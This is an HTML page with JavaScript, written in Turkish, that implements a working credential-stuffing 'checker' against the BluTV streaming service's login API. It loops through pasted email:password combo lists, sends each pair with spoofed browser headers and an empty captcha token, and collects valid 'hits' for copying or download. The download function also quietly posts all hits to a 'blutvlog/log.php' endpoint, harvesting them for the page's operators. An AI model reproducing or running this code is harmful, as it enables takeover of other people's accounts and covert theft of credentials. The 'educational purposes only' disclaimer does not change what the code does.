<!DOCTYPE html>
<link rel="shortcut icon" href="https://i.hizliresim.com/sqs8cst.jpg">
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BluTV Checker</title>
    <style>
        body {
            background-color: #111;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border-radius: 10px;
            background-color: #333;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        .dark-btn {
            background-color: #444;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
        }
        .dark-btn:hover {
            background-color: #555;
        }
        textarea {
            width: 100%;
            height: 200px;
            resize: none;
            margin-bottom: 10px;
            background-color: #444;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
      <img src="https://i.hizliresim.com/sqs8cst.jpg" alt="Zindan Logo" class="logo" width="256" height="auto">
        <h1>Ücretsiz BluTV Web Checker</h1>
	<h2>Sitenin kullanımı tamamen ücretsizdir.</h2>
        <textarea id="accountsInput" placeholder="Comboyu yapıştırın veya [Dosya Seç] butonuna basıp combo seçin.
Instagram:
Developer's: @medusa.v33 - @veraildez_v33
Ekip: @zindanv33"></textarea>
        <input type="file" id="fileInput" accept=".txt">
        <br>
	<br>
        <button class="dark-btn" onclick="toggleChecking()">Başlat/Durdur</button>
        <button class="dark-btn" onclick="copyHits()">Hitleri Kopyala</button>
        <button class="dark-btn" onclick="downloadHits()">Hitleri İndir</button>
        <br><br>
        <textarea id="hitsOutput" placeholder="Hitleriniz burada görünecek 
Eğer hiçbirşey görmüyorsanız hiç hit almadığınız anlamına gelir
Combonuzdan eminseniz consolu kontrol edin
Instagram:
Developer's: @medusa.v33 - @veraildez_v33
Ekip: @zindanv33" readonly></textarea>
    </div>

    <script>
        let accounts = [];
        let checking = false;
        let currentIndex = 0;
        let resumeIndex = 0;

        document.getElementById('fileInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onload = function(e) {
                const text = e.target.result;
                document.getElementById('accountsInput').value = text;
            };
            reader.readAsText(file);
        });

        function toggleChecking() {
            if (checking) {
                checking = false;
            } else {
                if (resumeIndex > 0) {
                    currentIndex = resumeIndex;
                }
                accounts = document.getElementById('accountsInput').value.split('\n').map(line => line.trim());
                checking = true;
                checkNextAccount();
            }
        }

        function checkNextAccount() {
            if (!checking || currentIndex >= accounts.length) {
                currentIndex = 0;
                resumeIndex = 0; // Yeniden başlatma konumunu sıfırla
                return;
            }
            const account = accounts[currentIndex];
            const [email, password] = account.split(':');

            const login_url = "https://www.blutv.com/api/login";
            const login_data = {
                "remember": "false",
                "username": email,
                "password": password,
                "captchaVersion": "v3",
                "captchaToken": ""
            };

            fetch(login_url, {
                method: 'POST',
                headers: {
                    'Host': 'www.blutv.com',
                    'Connection': 'keep-alive',
                    'AppPlatform': 'com.blu',
                    'Content-Type': 'text/plain;charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                    'AppCountry': 'TUR',
                    'AppLanguage': 'tr-TR',
                    'Accept': '*/*',
                    'Origin': 'https://www.blutv.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://www.blutv.com/giris',
                    'Accept-Language': 'tr-TR,tr;q=0.9',
                    'Accept-Encoding': 'gzip, deflate'
                },
                body: JSON.stringify(login_data)
            })
            .then(response => {
                if (response.status === 200) {
                    console.log(`Zindan BluTV Web Checker: (Hit) | ${email}:${password}`);
                    return response.json();
                } else {
                    console.log(`Zindan BluTV Web Checker: (Dec) | ${email}:${password}`);
                    return null;
                }
            })
            .then(data => {
                if (data) {
                    const hitsOutput = document.getElementById('hitsOutput');
                    hitsOutput.value += `${email}:${password}\n`;
                }
                currentIndex++;
                resumeIndex = currentIndex;
                if (checking) {
                    setTimeout(checkNextAccount, 0);
                }
            })
            .catch(error => {
                console.error('Hata oluştu:', error);
                currentIndex++;
                resumeIndex = currentIndex;
                if (checking) {
                    setTimeout(checkNextAccount, 0);
                }
            });
        }

        function copyHits() {
            const hits = document.getElementById('hitsOutput').value;
            navigator.clipboard.writeText(hits).then(() => {
                alert('Hitler kopyalandı!');
            }).catch(err => {
                console.error('Kopyalama hatası:', err);
            });
        }
        
        
        function downloadHits() {
    const hits = document.getElementById('hitsOutput').value;
    const blob = new Blob([hits], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'blutv_hits_zindan.txt';
    document.body.appendChild(a);
    a.click();
    // Loglama işlemi
    fetch('blutvlog/log.php', {
        method: 'POST',
        body: JSON.stringify({ hits: hits }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        console.log('İşlem başarıyla gerçekleştirildi.');
    })
    .catch(error => {
        console.error('Hata oluştu:', error);
    });
    window.URL.revokeObjectURL(url);
}

    </script>
<br>
Yasal Bilgilendirme Mesajı
<br>
<br>
Site içerisindeki yapılan eylemlerden kişi sorumludur.
<br>
Sadece eğitim amaçlıdır.
</body>
</html>
